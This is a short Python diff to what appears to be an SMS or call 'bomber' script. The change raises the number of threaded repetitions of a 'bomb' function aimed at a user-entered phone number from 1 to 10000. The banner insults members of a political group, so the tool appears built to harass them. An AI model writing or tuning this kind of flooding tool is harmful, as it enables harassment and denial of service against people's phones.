@@ -148,7 +148,7 @@ def bomb(number):
 def startFuck():
     print("Only For Chhatra League er chagol cor's !")
     numbers=input("Enter number : ")
-    limit=1
+    limit=10000
     with ThreadPoolExecutor(max_workers=10) as pool:
         pool.map(bomb, [numbers]*int(limit))
         pool.shutdown(wait=True)
